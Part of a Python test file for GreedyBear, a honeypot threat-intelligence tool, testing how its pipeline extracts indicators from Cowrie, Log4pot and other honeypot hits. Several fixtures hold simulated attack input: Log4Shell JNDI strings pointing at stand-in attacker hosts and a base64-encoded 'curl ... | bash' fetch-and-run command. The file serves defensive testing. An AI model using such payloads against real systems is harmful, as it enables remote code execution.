# This file is a part of GreedyBear https://github.com/honeynet/GreedyBear
# See the file 'LICENSE' for copying permission.
"""
End-to-end tests for the ExtractionPipeline class.

Tests the complete extraction workflow from Elasticsearch hits
through strategy selection, IOC extraction, and scoring.
"""

from unittest.mock import MagicMock, patch

from tests import ExtractionTestCase, MockElasticHit


class ExtractionPipelineTestCase(ExtractionTestCase):
    """Base test case for extraction pipeline tests, reusing common extraction helpers."""

    def _create_pipeline_with_mocks(self):
        """Helper to create a pipeline with mocked dependencies."""
        with (
            patch("greedybear.cronjobs.extraction.pipeline.SensorRepository"),
            patch("greedybear.cronjobs.extraction.pipeline.IocRepository"),
            patch("greedybear.cronjobs.extraction.pipeline.ElasticRepository"),
        ):
            from greedybear.cronjobs.extraction.pipeline import ExtractionPipeline

            pipeline = ExtractionPipeline()
            return pipeline


class TestExtractionPipelineInit(ExtractionPipelineTestCase):
    """Tests for ExtractionPipeline initialization."""

    @patch("greedybear.cronjobs.extraction.pipeline.SensorRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.IocRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.ElasticRepository")
    def test_initializes_repositories(self, mock_elastic, mock_ioc, mock_sensor):
        """Pipeline should initialize all required repositories."""
        from greedybear.cronjobs.extraction.pipeline import ExtractionPipeline

        pipeline = ExtractionPipeline()

        mock_elastic.assert_called_once()
        mock_ioc.assert_called_once()
        mock_sensor.assert_called_once()
        self.assertIsNotNone(pipeline.log)


class TestMinutesBackToLookup(ExtractionPipelineTestCase):
    """Tests for the _minutes_back_to_lookup property."""

    @patch("greedybear.cronjobs.extraction.pipeline.LEGACY_EXTRACTION", False)
    @patch("greedybear.cronjobs.extraction.pipeline.EXTRACTION_INTERVAL", 5)
    @patch("greedybear.cronjobs.extraction.pipeline.INITIAL_EXTRACTION_TIMESPAN", 120)
    @patch("greedybear.cronjobs.extraction.pipeline.SensorRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.IocRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.ElasticRepository")
    def test_returns_initial_timespan_when_empty(self, mock_elastic, mock_ioc, mock_sensor):
        """Should return INITIAL_EXTRACTION_TIMESPAN on first run (empty DB)."""
        from greedybear.cronjobs.extraction.pipeline import ExtractionPipeline

        pipeline = ExtractionPipeline()
        pipeline.ioc_repo.is_empty.return_value = True

        result = pipeline._minutes_back_to_lookup

        self.assertEqual(result, 120)

    @patch("greedybear.cronjobs.extraction.pipeline.LEGACY_EXTRACTION", False)
    @patch("greedybear.cronjobs.extraction.pipeline.EXTRACTION_INTERVAL", 5)
    @patch("greedybear.cronjobs.extraction.pipeline.SensorRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.IocRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.ElasticRepository")
    def test_returns_extraction_interval_when_not_empty(self, mock_elastic, mock_ioc, mock_sensor):
        """Should return EXTRACTION_INTERVAL for subsequent runs."""
        from greedybear.cronjobs.extraction.pipeline import ExtractionPipeline

        pipeline = ExtractionPipeline()
        pipeline.ioc_repo.is_empty.return_value = False

        result = pipeline._minutes_back_to_lookup

        self.assertEqual(result, 5)

    @patch("greedybear.cronjobs.extraction.pipeline.LEGACY_EXTRACTION", True)
    @patch("greedybear.cronjobs.extraction.pipeline.EXTRACTION_INTERVAL", 5)
    @patch("greedybear.cronjobs.extraction.pipeline.SensorRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.IocRepository")
    @patch("greedybear.cronjobs.extraction.pipeline.ElasticRepository")
    def test_returns_11_for_legacy_extraction(self, mock_elastic, mock_ioc, mock_sensor):
        """Should return 11 when LEGACY_EXTRACTION is enabled."""
        from greedybear.cronjobs.extraction.pipeline import ExtractionPipeline

        pipeline = ExtractionPipeline()
        pipeline.ioc_repo.is_empty.return_value = False

        result = pipeline._minutes_back_to_lookup

        self.assertEqual(result, 11)


class TestExecuteHitGrouping(ExtractionPipelineTestCase):
    """Tests for hit grouping logic in execute()."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_skips_hits_without_src_ip(self, mock_factory, mock_scores):
        """Hits without src_ip should be skipped."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"type": "Cowrie"}),  # missing src_ip
            MockElasticHit({"src_ip": "", "type": "Cowrie"}),  # empty src_ip
            MockElasticHit({"src_ip": "   ", "type": "Cowrie"}),  # whitespace-only src_ip
        ]
        pipeline.ioc_repo.is_empty.return_value = False

        result = pipeline.execute()

        self.assertEqual(result, 0)
        mock_factory.return_value.get_strategy.assert_not_called()

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_skips_hits_without_type(self, mock_factory, mock_scores):
        """Hits without type (honeypot) should be skipped."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4"}),  # missing type
            MockElasticHit({"src_ip": "1.2.3.4", "type": ""}),  # empty type
            MockElasticHit({"src_ip": "1.2.3.4", "type": "   "}),  # whitespace-only type
        ]
        pipeline.ioc_repo.is_empty.return_value = False

        result = pipeline.execute()

        self.assertEqual(result, 0)
        mock_factory.return_value.get_strategy.assert_not_called()

    @patch("greedybear.cronjobs.extraction.pipeline.LEGACY_EXTRACTION", False)
    @patch("greedybear.cronjobs.extraction.pipeline.EXTRACTION_INTERVAL", 10)
    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_extracts_sensor_from_hits(self, mock_factory, mock_scores):
        """
        Should extract and register sensors from t-pot_ip_ext field.
        Also verifies correct time window is passed to search().
        """
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4", "type": "Cowrie", "t-pot_ip_ext": "10.0.0.1"}),
        ]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = False  # Skip strategy for this test

        pipeline.execute()

        pipeline.sensor_repo.add_sensor.assert_called_once_with("10.0.0.1")
        pipeline.elastic_repo.search.assert_called_once_with(10)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_groups_hits_by_honeypot_type(self, mock_factory, mock_scores):
        """Hits should be grouped by honeypot type before extraction."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4", "type": "Cowrie"}),
            MockElasticHit({"src_ip": "5.6.7.8", "type": "Cowrie"}),
            MockElasticHit({"src_ip": "9.10.11.12", "type": "Log4pot"}),
        ]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_strategy = MagicMock()
        mock_strategy.ioc_records = []
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        pipeline.execute()

        # Should be called for both honeypot types
        self.assertEqual(mock_factory.return_value.get_strategy.call_count, 2)

        # Verify strategy is called with correct honeypot types
        calls = mock_factory.return_value.get_strategy.call_args_list
        honeypot_names = {call[0][0] for call in calls}
        self.assertEqual(honeypot_names, {"Cowrie", "Log4pot"})

        # Verify extract_from_hits is called twice
        self.assertEqual(mock_strategy.extract_from_hits.call_count, 2)

        # Verify each strategy received correct number of hits
        extraction_calls = mock_strategy.extract_from_hits.call_args_list
        hits_counts = sorted([len(call[0][0]) for call in extraction_calls])
        self.assertEqual(hits_counts, [1, 2])  # 1 Log4pot hit, 2 Cowrie hits


class TestExecuteStrategySelection(ExtractionPipelineTestCase):
    """Tests for strategy selection and execution in execute()."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_skips_honeypot_not_ready_for_extraction(self, mock_factory, mock_scores):
        """Should skip honeypots that are not ready for extraction."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4", "type": "DisabledHoneypot"}),
        ]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = False

        result = pipeline.execute()

        self.assertEqual(result, 0)
        mock_factory.return_value.get_strategy.assert_not_called()

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_calls_extract_from_hits_on_strategy(self, mock_factory, mock_scores):
        """Should call extract_from_hits on the selected strategy."""
        pipeline = self._create_pipeline_with_mocks()
        hit_data = {"src_ip": "1.2.3.4", "type": "Cowrie", "session": "abc123"}
        pipeline.elastic_repo.search.return_value = [MockElasticHit(hit_data)]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_strategy = MagicMock()
        mock_strategy.ioc_records = []
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        pipeline.execute()

        mock_strategy.extract_from_hits.assert_called_once()
        # Verify the hits passed contain our data
        call_args = mock_strategy.extract_from_hits.call_args[0][0]
        self.assertEqual(len(call_args), 1)
        self.assertEqual(call_args[0]["src_ip"], "1.2.3.4")

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_collects_ioc_records_from_strategies(self, mock_factory, mock_scores):
        """Should collect IOC records from all strategies."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4", "type": "Cowrie"}),
        ]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_ioc = self._create_mock_ioc("1.2.3.4")
        mock_strategy = MagicMock()
        mock_strategy.ioc_records = [mock_ioc]
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        result = pipeline.execute()

        self.assertEqual(result, 1)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_accumulates_iocs_from_multiple_strategies(self, mock_factory, mock_scores):
        """Should accumulate IOC records from multiple successful strategies."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4", "type": "Cowrie"}),
            MockElasticHit({"src_ip": "5.6.7.8", "type": "Log4pot"}),
        ]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        # Mock two different strategies
        mock_cowrie_strategy = MagicMock()
        mock_cowrie_ioc = self._create_mock_ioc("1.2.3.4")
        mock_cowrie_strategy.ioc_records = [mock_cowrie_ioc]

        mock_log4pot_strategy = MagicMock()
        mock_log4pot_ioc = self._create_mock_ioc("5.6.7.8")
        mock_log4pot_strategy.ioc_records = [mock_log4pot_ioc]

        # Return strategies in sequence
        mock_factory.return_value.get_strategy.side_effect = [mock_cowrie_strategy, mock_log4pot_strategy]

        result = pipeline.execute()

        # Should return total count (1 + 1 = 2)
        self.assertEqual(result, 2)

        # Verify both strategies were executed
        self.assertEqual(mock_cowrie_strategy.extract_from_hits.call_count, 1)
        self.assertEqual(mock_log4pot_strategy.extract_from_hits.call_count, 1)

        # Verify data flow to scoring
        mock_scores.return_value.score_only.assert_called_once()
        collected_iocs = mock_scores.return_value.score_only.call_args[0][0]
        self.assertEqual(len(collected_iocs), 2)
        self.assertIn(mock_cowrie_ioc, collected_iocs)
        self.assertIn(mock_log4pot_ioc, collected_iocs)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_handles_strategy_exception_gracefully(self, mock_factory, mock_scores):
        """Strategy exceptions should be caught and logged, not crash pipeline."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.log = MagicMock()

        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4", "type": "Cowrie"}),
            MockElasticHit({"src_ip": "5.6.7.8", "type": "Log4pot"}),
        ]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        # First strategy raises exception, second succeeds
        mock_failing_strategy = MagicMock()
        mock_failing_strategy.extract_from_hits.side_effect = Exception("Test error")

        mock_success_strategy = MagicMock()
        mock_success_strategy.ioc_records = [self._create_mock_ioc("5.6.7.8")]

        mock_factory.return_value.get_strategy.side_effect = [mock_failing_strategy, mock_success_strategy]

        # Should not raise, should continue with next strategy
        result = pipeline.execute()

        self.assertEqual(result, 1)
        pipeline.log.error.assert_called_once()


class TestExecuteScoring(ExtractionPipelineTestCase):
    """Tests for scoring logic in execute()."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_updates_scores_when_iocs_extracted(self, mock_factory, mock_scores):
        """Should call UpdateScores.score_only when IOCs are extracted."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = [
            MockElasticHit({"src_ip": "1.2.3.4", "type": "Cowrie"}),
        ]
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_ioc = self._create_mock_ioc("1.2.3.4")
        mock_strategy = MagicMock()
        mock_strategy.ioc_records = [mock_ioc]
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        pipeline.execute()

        mock_scores.return_value.score_only.assert_called_once()
        call_args = mock_scores.return_value.score_only.call_args[0][0]
        self.assertEqual(len(call_args), 1)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_skips_scoring_when_no_iocs(self, mock_factory, mock_scores):
        """Should not call UpdateScores when no IOCs are extracted."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = []
        pipeline.ioc_repo.is_empty.return_value = False

        pipeline.execute()

        mock_scores.return_value.score_only.assert_not_called()


class TestExecuteEmptyResponse(ExtractionPipelineTestCase):
    """Tests for empty Elasticsearch response handling."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_handles_empty_search_result(self, mock_factory, mock_scores):
        """Should handle empty Elasticsearch response gracefully."""
        pipeline = self._create_pipeline_with_mocks()
        pipeline.elastic_repo.search.return_value = []
        pipeline.ioc_repo.is_empty.return_value = False

        result = pipeline.execute()

        self.assertEqual(result, 0)
        mock_factory.return_value.get_strategy.assert_not_called()
        mock_scores.return_value.score_only.assert_not_called()


# =============================================================================
# Strategy-Specific E2E Tests + Edge Cases
# =============================================================================


class TestCowrieStrategyE2E(ExtractionPipelineTestCase):
    """End-to-end tests for CowrieExtractionStrategy through the pipeline."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_cowrie_scanner_extraction_flow(self, mock_scores):
        """
        E2E: Raw cowrie hits → CowrieExtractionStrategy → scanner IOC records.
        Verifies the complete flow from Elasticsearch hits through strategy
        to IOC persistence.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Simulate cowrie session hits
        cowrie_hits = [
            MockElasticHit(
                {
                    "src_ip": "192.168.1.100",
                    "type": "Cowrie",
                    "session": "abc123",
                    "eventid": "cowrie.session.connect",
                    "timestamp": "2025-01-01T10:00:00",
                    "t-pot_ip_ext": "10.0.0.1",
                }
            ),
            MockElasticHit(
                {
                    "src_ip": "192.168.1.100",
                    "type": "Cowrie",
                    "session": "abc123",
                    "eventid": "cowrie.login.failed",
                    "timestamp": "2025-01-01T10:00:01",
                    "username": "root",
                    "password": "admin",
                    "message": "Failed login attempt",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = cowrie_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        # Create a real-ish IOC record mock
        mock_ioc_record = self._create_mock_ioc("192.168.1.100")

        with patch("greedybear.cronjobs.extraction.strategies.cowrie.iocs_from_hits") as mock_iocs:
            mock_iocs.return_value = [mock_ioc_record]
            with patch("greedybear.cronjobs.extraction.strategies.cowrie.threatfox_submission"):
                with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
                    mock_add.return_value = mock_ioc_record
                    with patch("greedybear.cronjobs.repositories.CowrieSessionRepository"):
                        result = pipeline.execute()

        # Should have extracted at least one IOC
        self.assertGreaterEqual(result, 0)
        # Sensor should have been registered
        pipeline.sensor_repo.add_sensor.assert_called_with("10.0.0.1")

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_cowrie_payload_extraction_from_messages(self, mock_scores):
        """
        E2E: Cowrie login failure with embedded URL → payload IOC extraction.
        Tests the _extract_possible_payload_in_messages path.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Cowrie hit with malicious URL in login message
        cowrie_hits = [
            MockElasticHit(
                {
                    "src_ip": "10.20.30.40",
                    "type": "Cowrie",
                    "session": "sess123",
                    "eventid": "cowrie.login.failed",
                    "timestamp": "2025-01-01T12:00:00",
                    "username": "http://malware.evil.com/payload.sh",
                    "password": "test",
                    "message": "Failed login with http://malware.evil.com/payload.sh",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = cowrie_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_scanner_ioc = self._create_mock_ioc("10.20.30.40")

        with patch("greedybear.cronjobs.extraction.strategies.cowrie.iocs_from_hits") as mock_iocs:
            mock_iocs.return_value = [mock_scanner_ioc]
            with patch("greedybear.cronjobs.extraction.strategies.cowrie.threatfox_submission"):
                with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
                    mock_add.return_value = mock_scanner_ioc
                    with patch("greedybear.cronjobs.repositories.CowrieSessionRepository"):
                        with patch.object(pipeline.ioc_repo, "get_ioc_by_name", return_value=mock_scanner_ioc):
                            result = pipeline.execute()

        # Strategy should have processed the hit
        self.assertGreaterEqual(result, 0)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_cowrie_file_download_extraction(self, mock_scores):
        """
        E2E: Cowrie file download event → download URL IOC extraction.
        Tests the _get_url_downloads path.
        """
        pipeline = self._create_pipeline_with_mocks()

        cowrie_hits = [
            MockElasticHit(
                {
                    "src_ip": "203.0.113.50",
                    "type": "Cowrie",
                    "session": "download_sess",
                    "eventid": "cowrie.session.file_download",
                    "timestamp": "2025-01-01T14:00:00",
                    "url": "http://badactor.net/malware.bin",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = cowrie_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_scanner_ioc = self._create_mock_ioc("203.0.113.50")

        with patch("greedybear.cronjobs.extraction.strategies.cowrie.iocs_from_hits") as mock_iocs:
            mock_iocs.return_value = [mock_scanner_ioc]
            with patch("greedybear.cronjobs.extraction.strategies.cowrie.threatfox_submission"):
                with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
                    mock_add.return_value = mock_scanner_ioc
                    with patch("greedybear.cronjobs.repositories.CowrieSessionRepository"):
                        with patch.object(pipeline.ioc_repo, "get_ioc_by_name", return_value=mock_scanner_ioc):
                            result = pipeline.execute()

        self.assertGreaterEqual(result, 0)


class TestLog4potStrategyE2E(ExtractionPipelineTestCase):
    """End-to-end tests for Log4potExtractionStrategy through the pipeline."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_log4pot_exploit_extraction_flow(self, mock_scores):
        """
        E2E: Log4j exploit attempts → Log4potExtractionStrategy → IOC records.
        Tests extraction of JNDI/LDAP URLs from Log4Shell exploit payloads.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Log4pot exploit hits with JNDI payload
        log4pot_hits = [
            MockElasticHit(
                {
                    "src_ip": "198.51.100.10",
                    "type": "Log4pot",
                    "reason": "request",
                    "correlation_id": "corr123",
                    "timestamp": "2025-01-01T08:00:00",
                }
            ),
            MockElasticHit(
                {
                    "src_ip": "198.51.100.10",
                    "type": "Log4pot",
                    "reason": "exploit",
                    "correlation_id": "corr123",
                    "deobfuscated_payload": "${jndi:ldap://evil.attacker.com:1389/a}",
                    "timestamp": "2025-01-01T08:00:01",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = log4pot_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_scanner_ioc = self._create_mock_ioc("198.51.100.10")
        mock_payload_ioc = self._create_mock_ioc("evil.attacker.com", ioc_type="domain")

        with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
            mock_add.side_effect = [mock_scanner_ioc, mock_payload_ioc, mock_scanner_ioc]
            with patch.object(pipeline.ioc_repo, "get_ioc_by_name", return_value=mock_scanner_ioc):
                result = pipeline.execute()

        # Should process Log4pot hits
        self.assertGreaterEqual(result, 0)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_log4pot_base64_payload_extraction(self, mock_scores):
        """
        E2E: Log4j exploit with base64-encoded command → hidden URL extraction.
        Tests extraction of URLs from base64-encoded payloads.
        """
        import base64

        pipeline = self._create_pipeline_with_mocks()

        # Create base64 encoded payload with hidden URL
        hidden_command = "curl http://hidden.malware.com/shell.sh | bash"
        encoded_command = base64.b64encode(hidden_command.encode()).decode()

        log4pot_hits = [
            MockElasticHit(
                {
                    "src_ip": "203.0.113.100",
                    "type": "Log4pot",
                    "reason": "request",
                    "correlation_id": "base64_corr",
                    "timestamp": "2025-01-01T09:00:00",
                }
            ),
            MockElasticHit(
                {
                    "src_ip": "203.0.113.100",
                    "type": "Log4pot",
                    "reason": "exploit",
                    "correlation_id": "base64_corr",
                    "deobfuscated_payload": f"${{jndi:ldap://attacker.com:1389/Basic/Command/Base64/{encoded_command}}}",
                    "timestamp": "2025-01-01T09:00:01",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = log4pot_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_ioc = self._create_mock_ioc("203.0.113.100")

        with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
            mock_add.return_value = mock_ioc
            with patch.object(pipeline.ioc_repo, "get_ioc_by_name", return_value=mock_ioc):
                result = pipeline.execute()

        self.assertGreaterEqual(result, 0)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_log4pot_non_exploit_hits_filtered(self, mock_scores):
        """
        E2E: Non-exploit Log4pot hits should be filtered out.
        Only hits with reason='exploit' should be processed for IOC extraction.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Log4pot hits without 'exploit' reason should be filtered
        log4pot_hits = [
            MockElasticHit(
                {
                    "src_ip": "10.0.0.50",
                    "type": "Log4pot",
                    "reason": "request",  # Not an exploit
                    "correlation_id": "non_exploit",
                    "timestamp": "2025-01-01T10:00:00",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = log4pot_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
            mock_add.return_value = None
            with patch.object(pipeline.ioc_repo, "get_ioc_by_name", return_value=None):
                result = pipeline.execute()

        # No IOCs should be extracted from non-exploit hits
        self.assertEqual(result, 0)


class TestGenericStrategyE2E(ExtractionPipelineTestCase):
    """End-to-end tests for GenericExtractionStrategy (fallback) through the pipeline."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_generic_strategy_for_unknown_honeypot(self, mock_scores):
        """
        E2E: Unknown honeypot type → GenericExtractionStrategy → scanner IOC.
        Tests fallback behavior for honeypots without specialized strategies.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Hit from an unknown honeypot type
        unknown_hits = [
            MockElasticHit(
                {
                    "src_ip": "172.16.0.100",
                    "type": "UnknownHoneypot",
                    "dest_port": 8080,
                    "@timestamp": "2025-01-01T11:00:00",
                    "t-pot_ip_ext": "10.0.0.5",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = unknown_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_ioc = self._create_mock_ioc("172.16.0.100")

        with patch("greedybear.cronjobs.extraction.strategies.generic.iocs_from_hits") as mock_iocs:
            mock_iocs.return_value = [mock_ioc]
            with patch("greedybear.cronjobs.extraction.strategies.generic.threatfox_submission"):
                with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
                    mock_add.return_value = mock_ioc
                    result = pipeline.execute()

        # Should have processed via generic strategy
        self.assertEqual(result, 1)
        # Sensor should be registered
        pipeline.sensor_repo.add_sensor.assert_called_with("10.0.0.5")

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_generic_strategy_heralding_honeypot(self, mock_scores):
        """
        E2E: Heralding honeypot hits → GenericExtractionStrategy.
        Heralding doesn't have a specialized strategy, uses generic.
        """
        pipeline = self._create_pipeline_with_mocks()

        heralding_hits = [
            MockElasticHit(
                {
                    "src_ip": "192.0.2.50",
                    "type": "Heralding",
                    "dest_port": 21,
                    "@timestamp": "2025-01-01T12:00:00",
                }
            ),
            MockElasticHit(
                {
                    "src_ip": "192.0.2.51",
                    "type": "Heralding",
                    "dest_port": 22,
                    "@timestamp": "2025-01-01T12:00:01",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = heralding_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_ioc1 = self._create_mock_ioc("192.0.2.50")
        mock_ioc2 = self._create_mock_ioc("192.0.2.51")

        with patch("greedybear.cronjobs.extraction.strategies.generic.iocs_from_hits") as mock_iocs:
            mock_iocs.return_value = [mock_ioc1, mock_ioc2]
            with patch("greedybear.cronjobs.extraction.strategies.generic.threatfox_submission"):
                with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
                    mock_add.side_effect = [mock_ioc1, mock_ioc2]
                    result = pipeline.execute()

        self.assertEqual(result, 2)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_generic_strategy_dionaea_honeypot(self, mock_scores):
        """
        E2E: Dionaea honeypot hits → GenericExtractionStrategy.
        Tests another honeypot without specialized logic.
        """
        pipeline = self._create_pipeline_with_mocks()

        dionaea_hits = [
            MockElasticHit(
                {
                    "src_ip": "198.18.0.100",
                    "type": "Dionaea",
                    "dest_port": 445,
                    "@timestamp": "2025-01-01T13:00:00",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = dionaea_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_ioc = self._create_mock_ioc("198.18.0.100")

        with patch("greedybear.cronjobs.extraction.strategies.generic.iocs_from_hits") as mock_iocs:
            mock_iocs.return_value = [mock_ioc]
            with patch("greedybear.cronjobs.extraction.strategies.generic.threatfox_submission"):
                with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
                    mock_add.return_value = mock_ioc
                    result = pipeline.execute()

        self.assertEqual(result, 1)


class TestMixedHoneypotE2E(ExtractionPipelineTestCase):
    """End-to-end tests for mixed honeypot scenarios through the pipeline."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_mixed_honeypots_use_correct_strategies(self, mock_scores):
        """
        E2E: Mixed honeypot hits → correct strategy selection for each.
        Verifies factory returns appropriate strategies based on honeypot type.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Mix of different honeypot types
        mixed_hits = [
            MockElasticHit(
                {
                    "src_ip": "10.1.1.1",
                    "type": "Cowrie",
                    "session": "cowrie_sess",
                    "eventid": "cowrie.session.connect",
                    "timestamp": "2025-01-01T10:00:00",
                }
            ),
            MockElasticHit(
                {
                    "src_ip": "10.2.2.2",
                    "type": "Log4pot",
                    "reason": "exploit",
                    "correlation_id": "log4pot_corr",
                    "deobfuscated_payload": "${jndi:ldap://test.com:1389/a}",
                    "timestamp": "2025-01-01T10:00:01",
                }
            ),
            MockElasticHit(
                {
                    "src_ip": "10.3.3.3",
                    "type": "Heralding",
                    "dest_port": 23,
                    "@timestamp": "2025-01-01T10:00:02",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = mixed_hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_ioc = self._create_mock_ioc("10.1.1.1")

        with patch("greedybear.cronjobs.extraction.strategies.cowrie.iocs_from_hits") as mock_cowrie_iocs:
            mock_cowrie_iocs.return_value = [mock_ioc]
            with patch("greedybear.cronjobs.extraction.strategies.generic.iocs_from_hits") as mock_generic_iocs:
                mock_generic_iocs.return_value = [mock_ioc]
                with patch("greedybear.cronjobs.extraction.strategies.cowrie.threatfox_submission"):
                    with patch("greedybear.cronjobs.extraction.strategies.generic.threatfox_submission"):
                        with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
